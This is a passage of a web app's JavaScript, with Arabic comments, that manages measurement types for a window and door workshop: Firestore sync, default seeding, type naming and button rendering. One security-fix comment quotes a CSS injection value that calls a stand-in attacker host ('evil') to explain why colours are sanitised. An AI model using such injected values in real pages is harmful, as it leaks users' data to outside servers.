    const EXTRA_PALETTE = ['#199959', '#2d8459', '#b98c0f', '#199c5a', '#156e42', '#147a47', '#d33722', '#178f53'];
    let extraTypesCache = null;

    /* ⚠️ إصلاح 9.7.1 — العضو الجديد كان يرى الأنواع فارغة حتى تصل الشبكة.

       الأنواع تُقرأ من التخزين المحلي، وتُحدَّث من Firestore عبر
       attachExtraTypesSync. وذلك سليم لمن استعمل النظام من قبل: نسخته
       المحلية تظهر فوراً والسيرفر يصحّحها.

       أمّا **العضو الجديد على جهاز جديد** فتخزينه فارغ. فيسلسل الانتظار:
           wsReady → تهيئة التخزين → التحقق من الهوية → guardPage
           → attachExtraTypesSync → أول لقطة من Firestore
       وعلى شبكة ضعيفة — وهي حال الورشة — يمضي ذلك ثوانيَ يرى فيها
       عمود الأنواع **فارغاً تماماً**، فيظنّ النظام ناقصاً أو معطوباً،
       وربما أنشأ أنواعاً جديدة بيده فتتكرّر مع ما سيصل.

       الآن: حين يكون التخزين فارغاً نُعيد الأنواع الافتراضية **فوراً**
       ومن غير حفظها. وعدم الحفظ مقصود: لو حُفظت لصارت «قائمة العضو»
       فسبقت القائمة المشتركة وربما كُتبت فوقها. فهي عرضٌ مؤقّت يزول
       من تلقائه لحظة وصول القائمة الحقيقية. */
    /* تنظيف الأنواع الرئيسية: يمنع بقاء نسخة قديمة باسم «سرانتي» أو تكرار
       «سكارات مطبخ»/أي نوع رئيسي بمعرّف آخر. النوع الرئيسي له ID واحد فقط.
       هذا التنظيف لا يمس الأنواع المخصصة الأخرى التي أضافها المستخدم. */
    function sanitizeExtraTypes(list) {
      const src = Array.isArray(list) ? list : [];
      const canonical = {};
      if (typeof DEFAULT_EXTRA_TYPES !== 'undefined') {
        DEFAULT_EXTRA_TYPES.forEach(d => { canonical[d.id] = d; });
      }
      const canonicalNames = {};
      Object.keys(canonical).forEach(id => {
        const d = canonical[id];
        canonicalNames[normName(d.name)] = id;
        if (d.originalName) canonicalNames[normName(d.originalName)] = id;
      });
      const out = [];
      const seen = new Set();
      src.forEach(t => {
        if (!t || !t.id) return;
        const nameNorm = normName(t.name || t.originalName || '');
        // «سرانتي» القديم ليس نوعاً مستقلاً؛ لا نعرضه ولا نعيده.
        if (nameNorm === normName('سرانتي')) return;
        const canonicalId = canonicalNames[nameNorm];
        if (canonicalId && t.id !== canonicalId) return; // نسخة مكررة من نوع رئيسي
        if (seen.has(t.id)) return;
        seen.add(t.id);
        out.push(t);
      });
      return out;
    }

    function getExtraTypes() {
      if (extraTypesCache === null || extraTypesCache === undefined) {
        try { extraTypesCache = JSON.parse(safeGetItem('ws_extra_types') || '[]'); }
        catch(e) { extraTypesCache = []; }
      }
      // تنظيف النسخة القديمة أولاً حتى لا يظهر «سرانتي» أو تتكرر «سكارات مطبخ».
      extraTypesCache = sanitizeExtraTypes(extraTypesCache);
      // الافتراضيات الأساسية تُزرع محلياً فوراً: لا ننتظر Firestore ولا الشبكة.
      // الموجود محلياً/المخصص يبقى، والأنواع الأساسية الناقصة تُضاف تلقائياً.
      if (typeof DEFAULT_EXTRA_TYPES !== 'undefined') {
        const byId = {};
        extraTypesCache.forEach(t => { if (t && t.id) byId[t.id] = t; });
        DEFAULT_EXTRA_TYPES.forEach(d => {
          if (!byId[d.id]) byId[d.id] = Object.assign({}, d);
          else if(d.id === ALUM_ID && ['ألمونيوم','المنيوم','الومنيوم'].map(normName).includes(normName(byId[d.id].name))) {
            byId[d.id].name = d.name;
            byId[d.id].originalName = d.name;
          }
        });
        extraTypesCache = sanitizeExtraTypes(Object.values(byId));
        try { safeSetItem('ws_extra_types', JSON.stringify(extraTypesCache)); } catch(e) {}
      }
      return Array.isArray(extraTypesCache) ? extraTypesCache : [];
    }
    /* ══ مزامنة الأنواع بين الأعضاء ══
       كانت الأنواع محفوظة في جهاز كل عضو وحده. فيضيف عضو نوعاً جديداً
       («شبك حماية» مثلاً) ويستعمله في مقاساته، ثم يفتح زميله الكراسة من
       الأرشيف فيجد صفوفاً بنوع لا يعرفه: بلا اسم ولا لون ولا طريقة حساب.

       الآن تُحفظ في Firestore فتظهر عند الجميع لحظياً. والنسخة المحلية
       تبقى كما هي فيعمل التطبيق دون اتصال، وتُحدَّث من السيرفر فور وصوله.

       مستند واحد لا مستند لكل نوع: القائمة قصيرة وتُقرأ كاملة دائماً،
       وتقسيمها يعني قراءات أكثر بلا فائدة. */
    let extraTypesUnsub = null;
    let _lastTypesJSON = '';
    let _lastCustomTypesJSON = '';

    function saveExtraTypes(list, opts) {
      extraTypesCache = list;
      safeSetItem('ws_extra_types', JSON.stringify(list));
      // opts.fromServer: وصلت من المزامنة، فلا نعيد كتابتها ونحدث حلقة.
      if (opts && opts.fromServer) return;
      try {
        const payload = JSON.stringify(list);
        if (payload === _lastTypesJSON) return;
        _lastTypesJSON = payload;
        // عند إضافة نوع جديد من جهاز عضو: دمج ذري مع القائمة الحالية على السيرفر،
        // بدلاً من set كامل قد يمحو نوعاً أضافه عضو آخر قبل لحظات.
        if (opts && opts.merge && db && db.runTransaction) {
          db.runTransaction(async tx => {
            const ref = db.collection('measurementTypes').doc('list');
            const snap = await tx.get(ref);
            const data = snap.exists ? (snap.data() || {}) : {};
            const server = Array.isArray(data.types) ? data.types : [];
            const byId = {};
            server.forEach(t => { if (t && t.id) byId[t.id] = t; });
            list.forEach(t => { if (t && t.id) byId[t.id] = t; });
            tx.set(ref, { types: Object.values(byId), primaryTypes: PRIMARY_TYPE_MANIFEST, updatedAt: Date.now(), updatedBy: (window.currentShopUser && window.currentShopUser.name) || '' }, { merge: true });
          }).catch(e => console.warn('مزامنة الأنواع:', e));
        } else {
          fsSet('measurementTypes', 'list', {
            types: list,
            primaryTypes: PRIMARY_TYPE_MANIFEST,
            updatedAt: Date.now(),
            updatedBy: (window.currentShopUser && window.currentShopUser.name) || ''
          });
        }
      } catch (e) { console.error('مزامنة الأنواع:', e); }
    }

    let _typesSeeded = false;

    function attachExtraTypesSync() {
      if (extraTypesUnsub) return;
      extraTypesUnsub = db.collection('measurementTypes').doc('list')
        .onSnapshot(doc => {
          /* لا قائمة على السيرفر بعد = أول تشغيل للنظام كله. نهيّئ الأنواع
             الافتراضية مرة واحدة ونرفعها، فتصير مرجعاً للجميع.
             وبما أن التهيئة لا تقع إلا هنا، لا يستطيع جهاز جديد أن يكتب
             الافتراضيات فوق قائمة مشتركة قائمة أصلاً. */
          if (!doc.exists) {
            if (_typesSeeded) return;
            _typesSeeded = true;
            try { seedExtraTypes(); refreshExtraTypeUI(); } catch (e) { console.error('seedExtraTypes:', e); }
            return;
          }
          _typesSeeded = true;
          const v = doc.data() || {};
          let changed = false;
          if (Array.isArray(v.types)) {
            const incomingList = v.types.map(t => t && Object.assign({}, t, { originalName: t.originalName || t.name })).filter(Boolean);
            const byId = {};
            incomingList.forEach(t => { if (t.id) byId[t.id] = t; });
            DEFAULT_EXTRA_TYPES.forEach(d => {
              if (!byId[d.id]) byId[d.id] = Object.assign({}, d);
              else if(d.id === ALUM_ID && ['ألمونيوم','المنيوم','الومنيوم'].map(normName).includes(normName(byId[d.id].name))) {
                byId[d.id].name = d.name;
                byId[d.id].originalName = d.name;
              }
            });
            const mergedIncoming = sanitizeExtraTypes(Object.values(byId));
            const incoming = JSON.stringify(mergedIncoming);
            const localBefore = JSON.stringify(getExtraTypes());
            if (incoming !== localBefore) {
              _lastTypesJSON = incoming;
              saveExtraTypes(mergedIncoming, { fromServer: true });
              changed = true;
            } else { _lastTypesJSON = incoming; }
            // إذا كانت القاعدة القديمة تحتوي «سرانتي» أو نسخاً مكررة من
            // الأنواع الرئيسية، أو كانت ناقصة نوعاً أساسياً، أعد رفع القائمة النظيفة.
            if (mergedIncoming.length !== incomingList.length || JSON.stringify(mergedIncoming) !== JSON.stringify(incomingList)) {
              try { fsSet('measurementTypes', 'list', { types: mergedIncoming, updatedAt: Date.now(), updatedBy: (window.currentShopUser && window.currentShopUser.name) || '' }); } catch(e) {}
            }
          }
          if (Array.isArray(v.customTypes)) {
            const incomingCustom = JSON.stringify(v.customTypes);
            if (incomingCustom !== JSON.stringify(getCustomTypes())) {
              _lastCustomTypesJSON = incomingCustom;
              saveCustomTypes(sanitizeCustomTypes(v.customTypes.map(t => t && Object.assign({}, t, { originalName: t.originalName || t.name }))), { fromServer: true });
              changed = true;
            } else { _lastCustomTypesJSON = incomingCustom; }
          }
          if (changed) {
            try { mergeDuplicateTypeNames(); } catch(e) {}
            try {
              refreshExtraTypeUI();
              renderTypeButtons();
              renderCustomTypeBoxes();
              renderCopyButtons();
              renderBulkPanes();
              renderTable();
            } catch (e) { console.error('تحديث الأنواع من المزامنة:', e); }
            if (v.updatedBy && v.updatedBy !== ((window.currentShopUser && window.currentShopUser.name) || '')) {
              showMiniToast('🔄 تمت مزامنة الأنواع بواسطة ' + v.updatedBy, '#137343');
            }
          }
        }, err => console.warn('مزامنة الأنواع:', err && err.code));
    }
    // الثلاث إضافات المطلوبة تُنشأ مرة واحدة فقط عند أول تشغيل بعد التحديث
    // (العلامة المحفوظة تمنع رجوعها من جديد لو حذفها المستخدم لاحقاً)
    /* ============================================================
       «سرانتي عادي» — إضافة بقاعدة مقاس خاصة
       ------------------------------------------------------------
       بقية الإضافات تأخذ نفس مقاس النافذة أو الباب حرفياً. أما السرانتي
       العادي فيُركَّب حول الفتحة، فيزيد عرضه 1 سم وارتفاعه 15 سم:
           99 × 100  →  100 × 115
       القاعدة محفوظة في التعريف نفسه (addW / addH) لا في الكود، فيمكن
       تعديل الرقمين لاحقاً من محرّر الإضافة بلا تغيير برمجي.
       ============================================================ */
    const SER_NORMAL_ID = 'xtype_ser_normal';
    const ALUM_ID = 'xtype_alum';

    /* ══ الأنواع الافتراضية ══
       الخمسة المطلوبة، بترتيبها الثابت:
         سرانتي عادي ← ألمونيوم ← سرانتي خارجي ← ناموسية متحركة ← ناموسية ثابتة
       (وPVC نوع أساسي مستقل، مع حفظ تعريف الأنواع الرئيسية أيضاً في manifest مشترك على Firebase.) */
    const PRIMARY_TYPE_MANIFEST = [
      { id: 'pvc', name: 'PVC', color: '#147d49', icon: 'fa-window-maximize', calc: 'pvc' },
      { id: 'xtype_pvc_slide', name: 'PVC سحاب' },
      { id: ALUM_ID, name: 'المونيوم' },
      { id: SER_NORMAL_ID, name: 'سرانتي عادي' },
      { id: 'xtype_ser_out', name: 'سرانتي خارجي' },
      { id: 'xtype_net_move', name: 'ناموسية متحركة' },
      { id: 'xtype_net_fix', name: 'ناموسية ثابتة' },
      { id: 'xtype_box_pvc', name: 'صندوق PVC' },
      { id: 'xtype_box_light', name: 'صندوق خفاف' },
      { id: 'xtype_kitchen_skirt', name: 'سكارات مطبخ' }
    ];

    const DEFAULT_EXTRA_TYPES = [
      /* الأنواع الرئيسية الجديدة/الثابتة. تُحفظ محلياً وتُزامَن في Firestore،
         وتُعرض في منتقي الأنواع كأنواع أساسية لا كإضافات عابرة. */
      { id: 'xtype_pvc_slide',  name: 'PVC سحاب',       color: '#16874f', icon: 'fa-arrows-left-right', calc: 'pvc', addW: 0, addH: 0, asType: true },
      { id: 'xtype_alum',       name: 'المونيوم',       color: '#6e7471', icon: 'fa-window-restore',    calc: 'pvc', addW: 0, addH: 0, asType: true },
      { id: 'xtype_ser_normal', name: 'سرانتي عادي',    color: '#0e91a0', icon: 'fa-border-all',        calc: 'ser', addW: 1, addH: 15, asType: true },
      { id: 'xtype_ser_out',    name: 'سرانتي خارجي',   color: '#199959', icon: 'fa-border-none',       calc: 'ser', addW: 0, addH: 0, asType: true },
      { id: 'xtype_net_move',   name: 'ناموسية متحركة', color: '#2d8459', icon: 'fa-arrows-left-right', calc: 'ser', addW: 0, addH: 0, asType: true },
      { id: 'xtype_net_fix',    name: 'ناموسية ثابتة',  color: '#b98c0f', icon: 'fa-square-full',       calc: 'ser', addW: 0, addH: 0, asType: true },
      { id: 'xtype_box_pvc',    name: 'صندوق PVC',      color: '#156e42', icon: 'fa-box',               calc: 'pvc', addW: 0, addH: 0, asType: true },
      { id: 'xtype_box_light',  name: 'صندوق خفاف',     color: '#147a47', icon: 'fa-box-open',           calc: 'pvc', addW: 0, addH: 0, asType: true },
      { id: 'xtype_kitchen_skirt', name: 'سكارات مطبخ', color: '#b98c0f', icon: 'fa-kitchen-set',       calc: 'pvc', addW: 0, addH: 0, asType: true }
    ];

    /* ══ التهيئة: كتابة واحدة لا ثلاث ══
       كانت تُنشئ الأنواع على ثلاث دفعات، وكل دفعة تكتب في Firestore.
       والمستمع الحيّ يعود بلقطة كل كتابة: فتصل لقطة الدفعة الأولى (ثلاثة
       أنواع) بعد أن صارت القائمة محلياً خمسة، فيراها المستمع مختلفة
       ويكتبها فوق المحلية — **فتُمحى الأنواع التي أُضيفت للتو**.

       والنتيجة تتفاوت بترتيب وصول اللقطات: قد تبقى ثلاثة، وقد يبقى نوع
       واحد. ولهذا رأيتَ نوعاً واحداً في التطبيق المستقل: قاعدة بياناته
       كانت خالية من مستند الأنواع، فجرت التهيئة كاملةً وسابقت لقطاتُها
       بعضها.

       الآن: تُبنى القائمة كاملة في الذاكرة ثم تُكتب **مرة واحدة**،
       فلا لقطة وسيطة تسبق أخرى. */
    function seedExtraTypes() {
      const cur = getExtraTypes();
      const byId = {};
      cur.forEach(t => { if (t && t.id) byId[t.id] = t; });

      // الموجود يبقى كما هو (قد يكون المستخدم عدّل اسمه أو قاعدته)
      DEFAULT_EXTRA_TYPES.forEach(d => {
        if (!byId[d.id]) byId[d.id] = Object.assign({}, d);
        else if(d.id === ALUM_ID && ['ألمونيوم','المنيوم','الومنيوم'].map(normName).includes(normName(byId[d.id].name))) {
          byId[d.id].name = d.name;
          byId[d.id].originalName = d.name;
        }
      });

      const ORDER = DEFAULT_EXTRA_TYPES.map(d => d.id);
      const merged = sanitizeExtraTypes(Object.keys(byId).map(k => byId[k])).sort((a, b) => {
        const ia = ORDER.indexOf(a.id), ib = ORDER.indexOf(b.id);
        return (ia === -1 ? 99 : ia) - (ib === -1 ? 99 : ib);
      });

      saveExtraTypes(merged);      // كتابة واحدة
      // العلامات المحلية لم تعد تحكم التهيئة (المستند على السيرفر يحكمها)،
      // لكن نضعها لتوافق النسخ القديمة التي تقرؤها.
      safeSetItem('ws_extras_seeded', '1');
      safeSetItem('ws_ser_normal_seeded', '1');
      safeSetItem('ws_alum_seeded', '1');
    }

    /* استعادة الأنواع الافتراضية الناقصة — بيد المستخدم لا تلقائياً.
       تلقائيةً كانت ستُعيد نوعاً حذفه الفريق عمداً مع كل جهاز جديد. */
    function restoreDefaultTypes() {
      const cur = getExtraTypes();
      const have = cur.map(t => t.id);
      const missing = DEFAULT_EXTRA_TYPES.filter(d => have.indexOf(d.id) === -1);
      if (!missing.length) { alert('كل الأنواع الافتراضية موجودة ✅'); return; }
      if (!confirm('الأنواع الناقصة:\n   • ' + missing.map(m => m.name).join('\n   • ') +
                   '\n\nاستعادتها؟ (لن يُمسّ ما أضفته أو عدّلته)')) return;

      const ORDER = DEFAULT_EXTRA_TYPES.map(d => d.id);
      const merged = cur.concat(missing.map(m => Object.assign({}, m))).sort((a, b) => {
        const ia = ORDER.indexOf(a.id), ib = ORDER.indexOf(b.id);
        return (ia === -1 ? 99 : ia) - (ib === -1 ? 99 : ib);
      });
      saveExtraTypes(merged);
      renderExtraChips();
      showMiniToast('استُعيد ' + missing.length + ' نوعاً ✅', '#047480');
    }
    window.restoreDefaultTypes = restoreDefaultTypes;


    // الإضافات التي عليها علامة ✓ حالياً (تبقى محفوظة حتى بعد إغلاق التطبيق)
    function getExtraRepeats() {
      try { return JSON.parse(safeGetItem('ws_extra_repeat') || '[]'); } catch(e) { return []; }
    }
    function saveExtraRepeats(ids) { safeSetItem('ws_extra_repeat', JSON.stringify(ids)); }
    function isExtraRepeating(id) { return getExtraRepeats().indexOf(id) > -1; }
    /* ============================================================
       علامات الأنواع الثابتة (بيفيسي / ألمونيوم / سرانتي / أي نوع مضاف)
       ------------------------------------------------------------
       تختلف عن الإضافات السريعة في أمر واحد جوهري: هذه العلامة **تبقى**
       بعد إضافة المقاس ولا تُمسح إلا بيد المستخدم، لأن أغلب المقاسات في
       الشغلة الواحدة تكون من نفس النوع. بيفيسي مؤشَّر افتراضياً من أول تشغيل.
       ============================================================ */

    // صف بنفس المقاس تحت نوع أساسي، بحساب الناتج وحقول النوع الخاصة به

    // تُمسح علامات الإضافات السريعة فقط بعد إضافة المقاس — علامات الأنواع تبقى
    function clearExtraRepeats() {
      if(getExtraRepeats().length === 0) return;
      saveExtraRepeats([]);
      renderExtraChips();
      updateMainActionLabel();
    }
    function toggleExtraRepeat(id, on) {
      if (on && !extrasAllowedFor(activeType)) {
        showMiniToast('الإضافات السريعة تعمل مع قسم PVC فقط', '#157f4a');
        renderExtraChips();
        return;
      }
      let ids = getExtraRepeats().filter(x => x !== id);
      if(on) ids.push(id);
      saveExtraRepeats(ids);
      renderExtraChips();
      updateMainActionLabel();
    }
    // تحويل لون Hex إلى rgba بشفافية معيّنة (لخلفيات الصفوف والتوهج عند التفعيل)
    function hexToRgba(hex, alpha) {
      hex = (hex || '#6e7471').replace('#', '');
      if(hex.length === 3) hex = hex.split('').map(c => c + c).join('');
      const r = parseInt(hex.substring(0,2), 16), g = parseInt(hex.substring(2,4), 16), b = parseInt(hex.substring(4,6), 16);
      return `rgba(${r},${g},${b},${alpha})`;
    }
    /* escapeHtml/escapeAttr يأتيان من shared.js (اسمان ثانيان لـ escHtml/escAttr).
       حُذف التعريف المكرّر في 8.9.2: كان السلوك نفسه معرَّفاً في ثلاثة مواضع،
       وخطر ذلك ليس طول الملف بل أن يُصلَح أحدها يوماً ويُنسى الآخران. */

    // قائمة كل الأقسام المتاحة حالياً (الثابتة + المخصصة) مع معرّفات حقول العرض/الارتفاع الخاصة بكل قسم
    function getAllTypeDefs() {
      const custom = getCustomTypes();
      const definitions = [
        { id: 'pvc', name: 'PVC', w: 'pw', h: 'ph', color: '#147d49', icon: 'fa-window-maximize' },
        ...custom.map(t => ({ id: t.id, name: t.name, originalName: t.originalName || t.name, w: 'cw_' + t.id, h: 'ch_' + t.id, color: t.color, icon: t.icon || 'fa-shapes', calc: t.calc || 'pvc', custom: true })),
        // الإضافات السريعة أنواع كاملة أيضاً (شارة، إجمالي، بند مالي، نسخ، إرسال للقص)
        // ومُعلَّمة بـ extra:true حتى لا تظهر ضمن أزرار الأقسام ومربعات اللصق
        /* الإضافات تستخدم xw_/xh_ لا cw_/ch_: كلتا الدالتين تكتبان في
           inputSection نفسه، ونوعٌ يظهر في القائمتين كان يُنتج عنصرين
           بنفس المعرّف — فتُقرأ مقاسات كتلة ويُكتب في أخرى. */
        ...getExtraTypes().map(t => ({ id: t.id, name: t.name, originalName: t.originalName || t.name, w: 'xw_' + t.id, h: 'xh_' + t.id, color: t.color, icon: t.icon || 'fa-shapes', calc: t.calc || 'pvc', extra: true, asType: !!t.asType }))
      ];
      const order=window.WSEngine?.preferences(currentUserUid()).typeOrder||[];return definitions.sort((a,b)=>(order.includes(a.id)?order.indexOf(a.id):999)-(order.includes(b.id)?order.indexOf(b.id):999));
    }
    function boxIdFor(type) { return type === 'pvc' ? 'boxPvc' : type === 'seranati' ? 'boxSer' : 'box_' + type; }
    function btnIdFor(type) { return type === 'pvc' ? 'btnPvc' : type === 'seranati' ? 'btnSer' : 'btn_' + type; }

    /*
       9.9.11 — هوية النوع لا تُستنتج من الـ ID وحده.
       المقاس قد يصل من جهاز آخر قبل أن تصل تعريفات الأنواع، أو قد يكون
       النوع موجوداً في قاعدة البيانات فقط. لذلك يحتفظ كل صف بنسخة اسم النوع
       كما اختاره المستخدم، ونستخدمها كمرجع أخير بدلاً من عرض ID/رموز غريبة.
    */
    function getTypeName(type) {
      const raw = resolveTypeId(type);
      const lookup = (id) => {
        if(id === 'pvc') return 'PVC';
        if(id === 'seranati' || id === SER_NORMAL_ID) return 'سرانتي عادي';
        const custom = getCustomTypes().find(t => t && t.id === id);
        if(custom) return String(custom.originalName || custom.name || id);
        const extra = getExtraTypes().find(t => t && t.id === id);
        if(extra) return String(extra.originalName || extra.name || id);
        return '';
      };
      let name = lookup(raw);
      if(name) return name;

      // توافق مع البيانات القديمة التي خزّنت الاسم نفسه بدلاً من الـ ID.
      const defs = [];
      defs.push({id:'pvc',name:'PVC'},{id:'seranati',name:'سرانتي عادي'});
      getCustomTypes().forEach(t => defs.push(t));
      getExtraTypes().forEach(t => defs.push(t));
      const byName = defs.find(t => normName(t.name) === normName(raw) || normName(t.originalName) === normName(raw));
      if(byName) return String(byName.originalName || byName.name || raw);

      // النوع قد يكون معروفاً في صفّ محفوظ ولم تصل تعريفاته بعد.
      try {
        const row = Array.isArray(jobList) && jobList.find(i => i && String(i.type) === raw && (i.typeNameSnapshot || i.originalTypeName || i.typeDisplayName));
        if(row) return String(row.typeNameSnapshot || row.originalTypeName || row.typeDisplayName);
      } catch(e) {}

      const resolved = resolveTypeId(raw);
      if(resolved !== raw) {
        name = lookup(resolved);
        if(name) return name;
      }
      return raw || 'نوع غير محدد';
    }

    function typeDefinitionFor(id) {
      const raw = String(id || '');
      const defs = getAllTypeDefs();
      return defs.find(d => d.id === raw) || defs.find(d => d.id === resolveTypeId(raw)) || null;
    }

    function typeSnapshotFor(id) {
      const d = typeDefinitionFor(id);
      if(!d) return { typeNameSnapshot: getTypeName(id), typeOriginalName: getTypeName(id) };
      return {
        typeNameSnapshot: String(d.originalName || d.name || getTypeName(id)),
        typeOriginalName: String(d.originalName || d.name || getTypeName(id)),
        typeColorSnapshot: d.color || '',
        typeCalcSnapshot: d.calc || '',
        typeIconSnapshot: d.icon || ''
      };
    }

    function normalizeRowTypeIdentity(item) {
      if(!item) return item;
      const d = typeDefinitionFor(item.type);
      if(d) {
        const snap = typeSnapshotFor(item.type);
        if(!item.typeNameSnapshot) item.typeNameSnapshot = snap.typeNameSnapshot;
        if(!item.typeOriginalName) item.typeOriginalName = snap.typeOriginalName;
        if(!item.typeColorSnapshot) item.typeColorSnapshot = snap.typeColorSnapshot;
        if(!item.typeCalcSnapshot) item.typeCalcSnapshot = snap.typeCalcSnapshot;
      }
      return item;
    }

    // يبني/يحدّث ورقة أنماط تحتوي على لون كل نوع مخصص (خلفية الصف، حد اللون، شارة الاسم)
    function rebuildCustomTypeStyles() {
      let styleTag = document.getElementById('customTypeStyles');
      if(!styleTag) {
        styleTag = document.createElement('style');
        styleTag.id = 'customTypeStyles';
        document.head.appendChild(styleTag);
      }
      /* إصلاح 8.8.3: المعرّف واللون يُنظَّفان قبل بنائهما في CSS — انظر safeCls/safeColor */
      styleTag.textContent = getCustomTypes().concat(getExtraTypes()).map(t => {
        const cid = safeCls(t.id), col = safeColor(t.color);
        return `
        .${cid}-row { background-color: ${hexToRgba(col, 0.08)}; }
        .${cid}-row td:nth-child(2) { border-right: 4px solid ${col}; }
        .${cid}-badge { background: ${col}; color:#fff; padding:4px 10px; border-radius:8px; font-size:10px; font-weight:700; display:inline-block; }
      `; }).join('\n');
    }

    // يعيد بناء أزرار اختيار الأقسام (بيفيسي/سرانتي ثابتان + كل الأنواع المخصصة + زر الإضافة)
    // 9.9.16 — الأنواع لا تظهر دائماً على الشاشة. تظهر فقط داخل نافذة اختيار
    // الإضافة أو النسخ بعد ضغط المستخدم على الإجراء نفسه. إبقاء الحاويات مخفية
    // يمنع تكرار الأنواع تحت زر الإضافة أو في أماكن أخرى من الكراسة.
    function hidePersistentTypeLists() {
      ['typeButtonsRow','extrasCol','copyButtonsRow'].forEach(id => {
        const el = document.getElementById(id);
        if (el) { el.hidden = true; el.style.display = 'none'; }
      });
    }

    function renderTypeButtons() {
      rebuildCustomTypeStyles();
      const row = document.getElementById('typeButtonsRow');
      if (!row) return;

      // أعلى الكراسة يعرض نفس الأنواع التي يمكن استعمالها في الجدول:
      // الأنواع الأساسية + الأنواع الرئيسية المحلية + الأنواع المخصصة.
      // الإضافات السريعة غير المعلّمة كنوع لا تُعرض هنا.
      const defs = getAllTypeDefs().filter(t => {
        if (!t || !t.id || t.id === 'seranati' || t.legacy) return false;
        if (!t.extra) return true;
        return !!t.asType || isProtectedType(t.id);
      });
      const seen = new Set();
      const list = defs.filter(t => {
        if (seen.has(t.id)) return false;
        seen.add(t.id);
        return true;
      });

      row.innerHTML = list.map(t => {
        const removable = !isProtectedType(t.id);
        const edit = removable
          ? `<span class="rename-icon" onclick="event.stopPropagation();${t.extra ? `editExtraType('${escAttr(t.id)}', event)` : `renameCustomType('${escAttr(t.id)}', event)`}" title="تعديل الاسم أو الحذف"><i class="fas fa-pen"></i></span>`
          : '';
        return `<button type="button" id="btn_${escAttr(t.id)}" class="btn toggle-btn type-toggle-btn custom-type-btn" onclick="switchBox('${escAttr(t.id)}')" title="اختيار نوع ${escapeHtml(t.name)}">
          ${edit}<i class="fas ${safeCls(t.icon || 'fa-shapes')}"></i><span>${escapeHtml(t.name)}</span>
        </button>`;
      }).join('');

      try { renderExtraChips(); updateMainActionLabel(); } catch(e) {}
      hidePersistentTypeLists();
    }

    // يعيد بناء صناديق إدخال العرض/الارتفاع الخاصة بكل نوع مخصص داخل قسم الإدخال
    function renderCustomTypeBoxes() {
      const container = document.getElementById('inputSection');
      container.querySelectorAll('.custom-type-box').forEach(el => el.remove());
      getCustomTypes().forEach(t => {
        const div = document.createElement('div');
        div.id = 'box_' + t.id;
        div.className = 'grid custom-type-box';
        div.style.display = 'none';
        div.innerHTML = `
          <input type="text" lang="en" inputmode="decimal" id="cw_${safeCls(t.id)}" placeholder="العرض (${escapeHtml(t.name)})" class="custom-type-input numeric-input" style="border-color:${safeColor(t.color)};">
          <input type="text" lang="en" inputmode="decimal" id="ch_${safeCls(t.id)}" placeholder="الارتفاع (${escapeHtml(t.name)})" class="custom-type-input numeric-input" style="border-color:${safeColor(t.color)};">`;
        container.appendChild(div);
      });
    }

    // يعيد بناء أزرار نسخ قائمة المقاسات (بيفيسي/سرانتي ثابتان + كل نوع مخصص)
    function renderCopyButtons() {
      const row = document.getElementById('copyButtonsRow');
      if (!row) return;   // نفس الحماية: عنصر غائب لا يوقف بقية الرسم
      /* الصف يُبنى كاملاً في كل مرة. كانت أزرار PVC والسرانتي مكتوبة في
         الصفحة وتُضاف البقية بجانبها، فيظهر زر «سرانتي» ولا مقاس سرانتي
         واحد في الجدول — نسخة فارغة يظنها المستخدم عطلاً. الآن: لا يظهر
         زر إلا لنوع له مقاسات فعلاً. */
      row.innerHTML = '';
      const mk = (id, name, color) => {
        if (!jobList.some(i => i.type === id)) return;
        const btn = document.createElement('button');
        btn.className = 'btn custom-copy-btn';
        /* ⚠️ إصلاح 8.8.5 — آخر cssText بلا حارس، وهو الأخطر بينها.
           cssText تقبل **تصريحات كاملة** لا قيمة واحدة، فلونٌ مثل
               red;background:url(https://evil/?d=1)
           يفتح تصريحاً ثانياً ويُطلق طلباً لخادم المهاجم. وشقيقتاه في
           السطرين التاليين مرّتا بـ safeColor في 8.8.3 وفات هذا. */
        btn.style.cssText = `background:${safeColor(color)}; color:white; font-size:11px;`;
        btn.onclick = () => copyCutList(id);
        btn.innerHTML = `<i class="fas fa-copy"></i> ${escapeHtml(name)}`;
        row.appendChild(btn);
      };
      mk('pvc', getTypeName('pvc'), '#147d49');
      getCustomTypes().forEach(t => {
        const btn = document.createElement('button');
        btn.className = 'btn custom-copy-btn';
        btn.style.cssText = `background:${safeColor(t.color)}; color:white; font-size:11px;`;
        btn.onclick = () => copyCutList(t.id);
        btn.innerHTML = `<i class="fas fa-copy"></i> ${escapeHtml(t.name)}`;
        row.appendChild(btn);
      });
      // زر نسخ لكل إضافة سريعة، يظهر فقط إن كان لها مقاسات فعلاً في الجدول
      getExtraTypes().forEach(t => {
        if(!jobList.some(i => i.type === t.id)) return;
        const btn = document.createElement('button');
        btn.className = 'btn custom-copy-btn';
        btn.style.cssText = `background:${safeColor(t.color)}; color:white; font-size:11px;`;
        btn.onclick = () => copyCutList(t.id);
        btn.innerHTML = `<i class="fas fa-copy"></i> ${escapeHtml(t.name)}`;
        row.appendChild(btn);
      });
    }

    // ===== واجهة الإضافات السريعة =====

    // حقول عرض/ارتفاع مخفية لكل إضافة، تظهر فقط عند تعديل صف من نوعها من الجدول
    /* ══ معرّفات مستقلة لكتل الإضافات ══
       كانت تستعمل نفس نمط معرّفات الأقسام المخصصة (cw_/ch_)، وكلتا
       الدالتين تكتبان في inputSection نفسه. فلو حمل نوعٌ نفس المعرّف في
       القائمتين، ظهر عنصران بنفس الـid — و getElementById يُعيد الأول
       فقط، فتُقرأ مقاسات كتلة ويُكتب في أخرى.
       الإضافات صارت xw_/xh_ فلا تلتقي مع cw_/ch_ أبداً. */
    function renderExtraTypeBoxes() {
      const container = document.getElementById('inputSection');
      if(!container) return;
      container.querySelectorAll('.extra-type-box').forEach(el => el.remove());
      getExtraTypes().forEach(t => {
        const div = document.createElement('div');
        div.id = 'box_' + t.id;
        div.className = 'grid extra-type-box';
        div.style.display = 'none';
        div.innerHTML = `
          <input type="text" lang="en" inputmode="decimal" id="xw_${safeCls(t.id)}" placeholder="العرض (${escAttr(t.name)})" class="custom-type-input numeric-input" style="border-color:${safeColor(t.color)};">
          <input type="text" lang="en" inputmode="decimal" id="xh_${safeCls(t.id)}" placeholder="الارتفاع (${escAttr(t.name)})" class="custom-type-input numeric-input" style="border-color:${safeColor(t.color)};">`;
        container.appendChild(div);
      });
    }

    // عمود الأيقونات بجانب زر "إضافة للجدول": دائرة ✓ + أيقونة الإضافة + قلم التعديل
    /* العمود المجاور لزر الإضافة، مجموعتان مختلفتان في السلوك:
       (1) الأنواع: علامتها ثابتة لا تُمسح — بيفيسي أولاً ثم بقية الأنواع.
